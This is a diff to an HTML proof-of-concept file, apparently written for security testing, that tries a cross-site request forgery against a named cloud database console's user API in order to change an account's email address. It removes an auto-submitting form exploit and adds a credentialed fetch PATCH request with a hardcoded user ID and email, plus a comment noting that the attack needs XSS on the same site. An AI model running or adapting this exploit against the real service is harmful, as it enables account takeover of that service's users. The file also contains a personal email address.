@@ -4,15 +4,23 @@
   <title>CSRF PoC - Neon Email Change</title>
 </head>
 <body>
-  <form id="exploit-form"
-        action="https://console.neon.tech/api/v2/users/me"
-        method="POST"
-        enctype="text/plain">
-    <input name='{"id":"18b81f74-7623-427e-a297-d21b37d9b089","email":"baraq.ghaleb82@gmail.com","x":"'
-           value='"}'>
-  </form>
+  <!--
+    Prerequisite: execute this from a same-site context (e.g. XSS on *.neon.tech)
+    From cross-origin, the CORS preflight on application/json will block the response
+    but the PATCH itself may still fire depending on the server's CORS config.
+  -->
   <script>
-    document.getElementById('exploit-form').submit();
+    fetch("https://console.neon.tech/api/v2/users/me", {
+      method: "PATCH",
+      credentials: "include",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        id: "18b81f74-7623-427e-a297-d21b37d9b089",
+        email: "baraq.ghaleb82@gmail.com"
+      })
+    })
+    .then(r => alert("Status: " + r.status))
+    .catch(e => alert("Error: " + e.message));
   </script>
 </body>
 </html>
